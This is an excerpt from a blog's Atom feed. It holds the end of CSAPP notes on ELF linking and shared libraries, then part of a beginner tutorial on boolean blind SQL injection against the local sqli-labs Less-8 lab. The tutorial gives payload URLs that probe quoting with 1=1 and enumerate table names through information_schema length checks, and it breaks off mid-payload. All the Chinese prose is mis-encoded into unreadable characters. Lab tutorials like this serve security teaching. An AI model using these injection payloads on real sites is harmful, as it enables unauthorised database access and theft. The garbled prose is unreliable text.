data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/176914/15/29848/39627/634eb153E0acab51a/3b9cf273cfe87685.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>ä¸Šå›¾å±•ç¤ºäº†ELFé‡å®šä½æ¡ç›®çš„ç»“æ„ä½“å®šä¹‰ã€‚å…¶ä¸­<code>type</code>ï¼ˆé‡å®šä½ç±»å‹)æœ‰32ç§ï¼Œéœ€è¦çŸ¥é“çš„æœ‰ä¸¤ç§ï¼š</p><ul><li>R_X86_64_PC32ï¼ˆPCç›¸å¯¹åœ°å€ï¼ŒPCå€¼é€šå¸¸æ˜¯ä¸‹ä¸€æ¡æŒ‡ä»¤åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼‰</li><li>R_X86_64_32ï¼ˆç»å¯¹åœ°å€ï¼‰</li></ul><p>å…³äºé‡å®šä½çš„è®¡ç®—ï¼Œå¯ä»¥å‚è€ƒ<a href="https://www.bilibili.com/video/BV1JL411L7ku/?spm_id_from=333.788&amp;vd_source=4e92f73cbc9617a81ba285264ffa8b21">ã€CSAPP-æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‘7-6. é‡å®šä½_å“”å“©å“”å“©_bilibili</a></p><h2 id="å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶"><a href="#å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶" class="headerlink" title="å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶"></a>å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶</h2><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/10827/33/20034/40188/634eb167Ea13401e6/34b8bff6aa404b53.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/10827/33/20034/40188/634eb167Ea13401e6/34b8bff6aa404b53.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/10827/33/20034/40188/634eb167Ea13401e6/34b8bff6aa404b53.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>å¦‚å›¾æ‰€ç¤ºä¸ºå…¸å‹çš„ELFå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶<br>ELFå¯æ‰§è¡Œæ–‡ä»¶çš„è¿ç»­çš„ç‰‡è¢«æ˜ å°„åˆ°è¿ç»­çš„å†…å­˜æ®µï¼Œç¨‹åºå¤´éƒ¨è¡¨æè¿°äº†è¿™ç§æ˜ å°„å…³ç³»ã€‚</p><p>å°†ç¨‹åºä»ç£ç›˜å¤åˆ¶åˆ°å†…å­˜çš„è¿‡ç¨‹å«åš<strong>åŠ è½½</strong>ã€‚åŠ è½½å™¨è¿è¡Œæ—¶ï¼Œåˆ›å»ºå†…å­˜æ˜ åƒï¼Œåœ¨ç¨‹åºå¤´éƒ¨è¡¨çš„å¼•å¯¼ä¸‹ï¼ŒåŠ è½½å™¨å°†å¯æ‰§è¡Œæ–‡ä»¶çš„ç‰‡å¤åˆ¶åˆ°ä»£ç æ®µå’Œæ•°æ®æ®µï¼Œç„¶ååŠ è½½å™¨è·³è½¬åˆ°ç¨‹åºçš„å…¥å£ç‚¹ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/195189/4/28443/67990/634eb179E21703543/6728719e0f45347c.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/195189/4/28443/67990/634eb179E21703543/6728719e0f45347c.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/195189/4/28443/67990/634eb179E21703543/6728719e0f45347c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>å¦‚å›¾æ‰€ç¤ºä¸ºLinux x86-64è¿è¡Œæ—¶çš„å†…å­˜æ˜ åƒã€‚</p><h2 id="åŠ¨æ€é“¾æ¥å…±äº«åº“"><a href="#åŠ¨æ€é“¾æ¥å…±äº«åº“" class="headerlink" title="åŠ¨æ€é“¾æ¥å…±äº«åº“"></a>åŠ¨æ€é“¾æ¥å…±äº«åº“</h2><blockquote><p><em>å…±äº«åº“</em>æ˜¯ä¸€ä¸ªç›®æ ‡æ¨¡å—ï¼Œåœ¨è¿è¡Œæˆ–åŠ è½½æ—¶ï¼Œå¯ä»¥åŠ è½½åˆ°ä»»æ„çš„å†…å­˜åœ°å€ï¼Œå¹¶å’Œä¸€ä¸ªåœ¨å†…å­˜ä¸­çš„ç¨‹åºé“¾æ¥èµ·æ¥ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸º<em>åŠ¨æ€é“¾æ¥</em>ï¼Œæ˜¯ç”±ä¸€ä¸ªå«åš<em>åŠ¨æ€é“¾æ¥å™¨</em>çš„ç¨‹åºæ¥æ‰§è¡Œçš„ã€‚</p></blockquote><p>æ„é€ å…±äº«åº“çš„æ–¹å¼ä¸æ„é€ é™æ€åº“çš„æ–¹å¼å¾ˆç›¸ä¼¼ï¼Œåªéœ€å°†æ„é€ é™æ€åº“çš„ä»£ç ä¿®æ”¹ä¸ºï¼š</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fpic -o libvector.so addvec.c multvec.c</span><br></pre></td></tr></tbody></table></figure><p>åŠ¨æ€é“¾æ¥å…±äº«åº“çš„è¿‡ç¨‹å¦‚å›¾æ‰€ç¤ºï¼š</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/203281/17/28336/42024/634eb18dE02711f7a/01a276920d6d2f65.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/203281/17/28336/42024/634eb18dE02711f7a/01a276920d6d2f65.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/203281/17/28336/42024/634eb18dE02711f7a/01a276920d6d2f65.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>æ­¤å¤–ï¼Œè¿˜å¯ä»¥ä»åº”ç”¨ç¨‹åºä¸­åŠ è½½å’Œé“¾æ¥å…±äº«åº“ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/20079/10/18954/19705/634eb1aaEc8843c5a/ce326ca458cd49a0.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/20079/10/18954/19705/634eb1aaEc8843c5a/ce326ca458cd49a0.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/20079/10/18954/19705/634eb1aaEc8843c5a/ce326ca458cd49a0.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p><code>dlopen</code>å‡½æ•°åŠ è½½å’Œé“¾æ¥å…±äº«åº“<code>filename</code></p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/92289/7/22938/20139/634eb1beE46641a0d/172d988c21f67e68.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/92289/7/22938/20139/634eb1beE46641a0d/172d988c21f67e68.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/92289/7/22938/20139/634eb1beE46641a0d/172d988c21f67e68.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p><code>dlsym</code>å‡½æ•°è¿”å›è¾“å…¥ç¬¦å·çš„åœ°å€</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/147888/5/30474/15813/634eb1d1E8782e8a7/a0dead929423729e.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/147888/5/30474/15813/634eb1d1E8782e8a7/a0dead929423729e.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/147888/5/30474/15813/634eb1d1E8782e8a7/a0dead929423729e.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>å¦‚æœæ²¡æœ‰å…¶ä»–å…±äº«åº“è¿˜åœ¨ä½¿ç”¨è¯¥å…±äº«åº“ï¼Œ<code>dlclose</code>å‡½æ•°å°±å¸è½½è¯¥å…±äº«åº“</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t1/129870/32/29744/23258/634eb1e1E2a7c5ed3/02a68599e69c7024.png" data-fancybox="default" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t1/129870/32/29744/23258/634eb1e1E2a7c5ed3/02a68599e69c7024.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t1/129870/32/29744/23258/634eb1e1E2a7c5ed3/02a68599e69c7024.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p><code>dlerror</code>å‡½æ•°è¿”å›<code>dlopen</code>ã€<code>dlsym</code>æˆ–<code>dlclose</code>å‡½æ•°çš„é”™è¯¯ä¿¡æ¯ã€‚</p><h3 id="åº“æ‰“æ¡©æœºåˆ¶"><a href="#åº“æ‰“æ¡©æœºåˆ¶" class="headerlink" title="*åº“æ‰“æ¡©æœºåˆ¶"></a>*åº“æ‰“æ¡©æœºåˆ¶</h3><p>ä½œç”¨ï¼šæˆªè·å¯¹å…±äº«åº“å‡½æ•°çš„è°ƒç”¨ï¼Œç”¨å…¶ä»–ä»£ç å–ä»£</p><ul><li>ç¼–è¯‘æ—¶æ‰“æ¡©</li><li>é“¾æ¥æ—¶æ‰“æ¡©</li><li>è¿è¡Œæ—¶æ‰“æ¡©</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;è¿™ç¯‡æ–‡ç« æ˜¯é˜…è¯»ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹ç¬¬7ç« ï¼šé“¾æ¥åå†™ä¸‹çš„ï¼Œå¾ˆå¤šåœ°æ–¹å†™å¾—å¹¶ä¸è¯¦ç»†ï¼Œä¹Ÿæ— æ³•ä¿è¯å®Œå…¨æ­£ç¡®ã€‚ä¸»è¦æ˜¯ä¸ºäº†è®°å½•æˆ‘å­¦ä¹ é“¾æ¥ç›¸å…³çŸ¥è¯†çš„è¿‡ç¨‹ï¼Œä»…ä¾›å‚è€ƒã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="é˜…è¯»ç¬”è®°" scheme="https://blog.beacox.space/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CSAPP" scheme="https://blog.beacox.space/tags/CSAPP/"/>
    
    <category term="ç³»ç»Ÿ" scheme="https://blog.beacox.space/tags/%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>SQLæ³¨å…¥æ–°æ‰‹æ•™ç¨‹ï¼ˆä¸‰ï¼‰â€”â€”å¸ƒå°”ç›²æ³¨</title>
    <link href="https://blog.beacox.space/posts/sqli3/"/>
    <id>https://blog.beacox.space/posts/sqli3/</id>
    <published>2022-06-21T14:51:10.000Z</published>
    <updated>2022-06-21T14:51:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨<a href="../../posts/sqli2/">ä¸Šä¸€æœŸæ•™ç¨‹</a>ä¸­æˆ‘ä»¬å­¦ä¹ äº†åŸºäºæŠ¥é”™çš„æ³¨å…¥ï¼Œæˆ–è€…å‡†ç¡®åœ°è¯´æ˜¯GETå‹åŸºäºæŠ¥é”™çš„æ³¨å…¥ã€‚ç›¸ä¿¡å¤§å®¶ä¹Ÿçœ‹å‡ºæ¥äº†ï¼Œè¿™ç§æ³¨å…¥æ˜¯éå¸¸ç®€å•çš„ï¼Œæ„å‘³ç€è¿™ç§æ¼æ´æ˜¯éå¸¸ä½çº§çš„ã€‚æˆ‘ä»¬æ‰€è§åˆ°çš„å¤§å¤šæ•°ç½‘ç«™ä¸­éƒ½ä¸ä¼šå‡ºç°å¦‚æ­¤ä½çº§çš„SQLæ³¨å…¥æ¼æ´ã€‚æ›´å¤šæ—¶å€™é¡µé¢æ˜¯ä¸ä¼šå›æ˜¾æŠ¥é”™è¯­å¥çš„ï¼Œè¿™æ—¶å€™äº‹æƒ…å°±å˜å¤æ‚äº†ã€‚æˆ‘ä»¬æ— æ³•ç›´æ¥çœ‹åˆ°æŠ¥é”™è¯­å¥ï¼Œå°±éœ€è¦é€šè¿‡ä¼°è®¡ä¸åŒçš„æŸ¥è¯¢ç»“æœæ˜¯TRUEè¿˜æ˜¯FALSEæ¥åˆ¤æ–­æŸä¸ªæ•°æ®åº“æ˜¯å¦èƒ½å¤Ÿæ³¨å…¥ï¼Œè¿™å°±æ˜¯ç›²æ³¨ï¼</p><h2 id="å¸ƒå°”ç›²æ³¨åŸç†"><a href="#å¸ƒå°”ç›²æ³¨åŸç†" class="headerlink" title="å¸ƒå°”ç›²æ³¨åŸç†"></a>å¸ƒå°”ç›²æ³¨åŸç†</h2><p>ä¹‹æ‰€ä»¥å«ç›²æ³¨ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬åœ¨æ³¨å…¥çš„è¿‡ç¨‹ä¸­ä¸ä¼šçœ‹åˆ°åç«¯çš„é”™è¯¯è¿”å›è¯­å¥ã€‚æ­¤æ—¶ï¼Œå¦‚æœæˆ‘ä»¬æ‰§è¡Œçš„è¯­å¥è¿”å›å€¼ä¸º1ï¼Œé¡µé¢çš„æ˜¾ç¤ºæ˜¯ä¸€ç§æ¨¡æ ·ï¼Œå¦‚æœä¸º0ï¼Œé‚£ä¹ˆé¡µé¢çš„æ˜¾ç¤ºæ˜¯å¦ä¸€ç§æ¨¡æ ·ã€‚åˆ©ç”¨è¿™æ ·çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨SQLè¯­å¥ä¸­åŠ å…¥é€»è¾‘è¡¨è¾¾å¼ã€å…³ç³»è¡¨è¾¾å¼ï¼Œä¸æ–­è¯•é”™ï¼Œä»è€Œç†è®ºä¸Šèƒ½å¤Ÿè§£å¾—æˆ‘ä»¬æ‰€éœ€è¦çš„æ•°æ®ï¼Œè¿™å’ŒçŒœè§£å¯†ç æœ‰ç‚¹ç›¸ä¼¼ã€‚</p><h2 id="åˆ¤æ–­æ•°æ®åº“æ˜¯å¦èƒ½è¢«å¸ƒå°”ç›²æ³¨"><a href="#åˆ¤æ–­æ•°æ®åº“æ˜¯å¦èƒ½è¢«å¸ƒå°”ç›²æ³¨" class="headerlink" title="åˆ¤æ–­æ•°æ®åº“æ˜¯å¦èƒ½è¢«å¸ƒå°”ç›²æ³¨"></a>åˆ¤æ–­æ•°æ®åº“æ˜¯å¦èƒ½è¢«å¸ƒå°”ç›²æ³¨</h2><p>ä¾ç„¶ï¼Œæˆ‘ä»¬é¦–å…ˆæ‰“å¼€PHPstudyé¢æ¿ï¼Œå¯åŠ¨WAMPã€‚<br>åœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥<a href="http://localhost/sqli/Less-8/?id=1">http://localhost/sqli/Less-8/?id=1</a>è¿›å…¥Lesson8ï¼ˆæŒ‰ç…§ä½ çš„ç«¯å£å·ã€ç›®å½•åç­‰ä¿®æ”¹ï¼‰ã€‚<br>çŒœæµ‹å¯¹åº”çš„åç«¯SQLè¯­å¥ä¸ºï¼š</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><p>æ­¤æ—¶é¡µé¢æ˜¾ç¤ºå¦‚ä¸‹ï¼š</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/06/18/648e7967a8c5d.png" data-fancybox="default" data-caption="æœ‰æç¤ºæ–‡å­—"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/06/18/648e7967a8c5d.png" class="lazyload" data-srcset="https://bu.dusays.com/2023/06/18/648e7967a8c5d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="æœ‰æç¤ºæ–‡å­—"></a><span class="image-caption">æœ‰æç¤ºæ–‡å­—</span></div></div><p>æ¥ç€æˆ‘ä»¬å°è¯•ç ´åæŸ¥è¯¢ï¼Œåœ¨åœ°å€æ è¾“å…¥</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1'</span><br></pre></td></tr></tbody></table></figure><p>çŒœæµ‹å¯¹åº”çš„åç«¯SQLè¯­å¥ä¸ºï¼š</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></tbody></table></figure><p>å‘ç°é¡µé¢æ˜¾ç¤ºå¦‚ä¸‹ï¼š</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/06/18/648e7972bb2dc.png" data-fancybox="default" data-caption="æ— æç¤ºæ–‡å­—"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/06/18/648e7972bb2dc.png" class="lazyload" data-srcset="https://bu.dusays.com/2023/06/18/648e7972bb2dc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="æ— æç¤ºæ–‡å­—"></a><span class="image-caption">æ— æç¤ºæ–‡å­—</span></div></div><p>è§‚å¯Ÿä¸Šå›¾æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œ<code>You are in...</code>è¿™æ®µè¯ä¸è§äº†ï¼Œè¯´æ˜è¿™æ®µæŸ¥è¯¢è¯­å¥æ˜¯æœ‰é—®é¢˜çš„ï¼Œå³æˆ‘ä»¬ç ´åæŸ¥è¯¢æˆåŠŸäº†ã€‚ä½†æ˜¯é¡µé¢æ²¡æœ‰å›æ˜¾æŠ¥é”™ä¿¡æ¯ï¼Œè¯´æ˜æˆ‘ä»¬ä¹‹å‰ç”¨çš„æ˜¾æ³¨æ–¹æ³•å¤±æ•ˆäº†ã€‚è¿™æ—¶æˆ‘ä»¬ä¾¿è¦ç”¨åˆ°å¸ƒå°”ç›²æ³¨äº†ã€‚</p><p>æ¥ç€æˆ‘ä»¬å°±ç»§ç»­åˆ¤æ–­æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°åœ¨åç«¯æ˜¯å¦‚ä½•è¢«å°è£…çš„ã€‚<br>åœ¨åœ°å€æ è¾“å…¥</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:81/sqli/Less-8/?id=1' and 1=1 --+</span><br></pre></td></tr></tbody></table></figure><p>å‘ç°é‚£æ®µæ–‡å­—<code>You are in...</code>ï¼ˆåæ–‡ç§°æç¤ºæ–‡å­—ï¼‰åˆé‡æ–°å‡ºç°äº†ï¼Œè¿™è¯æ˜ï¼š(i)å‚æ•°æ˜¯ç”±å•å¼•å·å°è£…çš„ï¼›(ii)åç«¯å¯¹1=1è¿›è¡Œäº†åˆ¤æ–­å¹¶è¿”å›TRUEï¼Œå¯ä»¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ã€‚<br>å› æ­¤æ¨ç¿»ä¹‹å‰çš„SQLè¯­å¥çŒœæµ‹ï¼Œæ­¤å¤„åç«¯SQLè¯­å¥å½¢å¦‚ï¼š</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure><h2 id="å¸ƒå°”ç›²æ³¨æ€è·¯"><a href="#å¸ƒå°”ç›²æ³¨æ€è·¯" class="headerlink" title="å¸ƒå°”ç›²æ³¨æ€è·¯"></a>å¸ƒå°”ç›²æ³¨æ€è·¯</h2><p>ç¡®è®¤èƒ½å¤Ÿè¿›è¡Œå¸ƒå°”ç›²æ³¨åï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è·å–æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ã€‚é€šå¸¸ä¼šç¼–å†™è„šæœ¬æ¥è‡ªåŠ¨è¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼Œä½†æœ¬æ–‡é‡ç‚¹åœ¨äºå˜æ¸…å¸ƒå°”ç›²æ³¨çš„åŸç†å’Œå®ç°è·¯çº¿ï¼Œå› æ­¤é‡‡ç”¨æ‰‹åŠ¨æ³¨å…¥çš„æ–¹æ³•ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“å½“å‰æ•°æ®åº“æœ‰å“ªäº›è¡¨ã€å„è‡ªçš„åç§°ï¼Œå¹¶åˆ¤æ–­å“ªäº›è¡¨å«æœ‰é‡è¦ä¿¡æ¯ï¼›æ¥ç€ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“è¡¨é‡Œæœ‰å“ªäº›å­—æ®µã€å„è‡ªçš„åç§°ï¼Œå¹¶åˆ¤æ–­å“ªäº›å­—æ®µå«æœ‰é‡è¦ä¿¡æ¯ï¼›æœ€åæˆ‘ä»¬è·å–åˆ°ç›¸åº”å­—æ®µå¯¹åº”çš„æ¯ä¸€æ¡è®°å½•ã€‚</p><p>è¿™ä¸ªç”±å¤§åŠå°çš„æ€è·¯ä¸ä¹‹å‰çš„ç›²æ³¨å¹¶æ— å·®åˆ«ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯è¿™æ¬¡æˆ‘ä»¬ä¸ä¼šç›´æ¥çœ‹åˆ°æŸ¥è¯¢çš„ç»“æœï¼Œè€Œéœ€è¦é€šè¿‡é€»è¾‘è¡¨è¾¾å¼å’Œå…³ç³»è¡¨è¾¾å¼æ˜¯å¦è¿”å›ä¸ºTRUEæ¥çŒœè§£æˆ‘ä»¬æƒ³è¦å¾—åˆ°çš„ä¿¡æ¯ã€‚åœ¨å¸ƒå°”ç›²æ³¨çš„è¿‡ç¨‹ä¸­ï¼Œç”±äºè¡¨ä¸­æ•°æ®çš„ä¸ç¡®å®šæ€§ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦é€šè¿‡æšä¸¾å‡ºæŸ¥è¯¢ç»“æœæ‰€æœ‰å¯èƒ½çš„å€¼ï¼Œè¿™ä¸ªå·¥ä½œé‡æ˜¯éå¸¸å¤§çš„ã€‚å› æ­¤ï¼Œæˆ‘çš„æ–¹æ³•æ˜¯å…ˆç¡®å®šæ•°æ®åº“ä¸­è¡¨çš„æ•°é‡ï¼Œå†ç¡®å®šæ¯ä¸€ä¸ªè¡¨çš„åç§°ã€‚ç¡®å®šè¡¨åæ—¶ï¼Œå…ˆå¾—åˆ°æŸ¥è¯¢ç»“æœçš„å­—ç¬¦ä¸²é•¿åº¦åŒºé—´ï¼Œå†ç¡®å®šå­—ç¬¦ä¸²é•¿åº¦ï¼Œå…ˆç¡®å®šæ¯ä¸€ä¸ªå­—ç¬¦çš„ASCIIç åŒºé—´ï¼Œå†ç¡®å®šæ¯ä¸€ä¸ªå­—ç¬¦çš„ç¡®åˆ‡ASCIIç ã€‚å¦‚æœä½ æœ‰ç‚¹è¿·ç³Šäº†ï¼Œæ²¡æœ‰å…³ç³»ï¼Œè¯·æ¥ç€å¾€ä¸‹çœ‹ã€‚</p><h2 id="ç¡®å®šæ•°æ®åº“ä¸­è¡¨çš„æ•°é‡"><a href="#ç¡®å®šæ•°æ®åº“ä¸­è¡¨çš„æ•°é‡" class="headerlink" title="ç¡®å®šæ•°æ®åº“ä¸­è¡¨çš„æ•°é‡"></a>ç¡®å®šæ•°æ®åº“ä¸­è¡¨çš„æ•°é‡</h2><p>æˆ‘é‡‡ç”¨çš„æ–¹æ³•æ˜¯ï¼šè®©åç«¯åˆ¤æ–­ç¬¬nä¸ªè¡¨çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦å¤§äº0ï¼Œå¦‚æœæç¤ºæ–‡å­—å‡ºç°ï¼Œåˆ™è¯æ˜æ•°æ®åº“æœ‰ç¬¬nä¸ªè¡¨ï¼Œå¦åˆ™è¯æ˜æ•°æ®åº“ä¸­æœ€å¤šæœ‰n-1ä¸ªè¡¨ã€‚</p><p>åœ¨åœ°å€æ è¾“å…¥</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure><p>åç«¯SQLè¯­å¥å½¢å¦‚ï¼š</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> (length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">3</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> <span class="number">0</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure><p>è¿™æ®µè¯­å¥çš„æ„æ€ä¸ºï¼šä»æ•°æ®åº“çš„è¡¨åä¸­æŸ¥è¯¢id=â€™1â€™çš„æ‰€æœ‰å­—æ®µå¹¶ä¸”å½“å‰æ•°æ®åº“ä¸­çš„ç¬¬4ä¸ªè¡¨åå­—ç¬¦ä¸²é•¿åº¦å¤§äº0ã€‚å…¶ä¸­length()å‡½æ•°ä½œç”¨æ˜¯å–æŸ¥è¯¢ç»“æœçš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œç”¨æ³•ä¸ºlength(å­—ç¬¦ä¸²)ã€‚å¦‚æœä½ å¿˜äº†è¿™å¥è¯­å¥ä¸­å…¶ä»–åœ°æ–¹çš„å«ä¹‰ï¼Œè¯·è§<a href="../sqli2/">ä¸Šä¸€ç« </a>ã€‚<br>ç»“æœï¼Œé¡µé¢æ˜¾ç¤ºäº†æç¤ºæ–‡å­—ã€‚è¡¨æ˜å½“å‰æ•°æ®åº“è‡³å°‘æœ‰4å¼ è¡¨ã€‚<br>æ¥ç€æˆ‘ä»¬å°†åœ°å€æ ä¸­çš„å­—ç¬¦æ”¹ä¸º</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 4,1))) &gt; 0 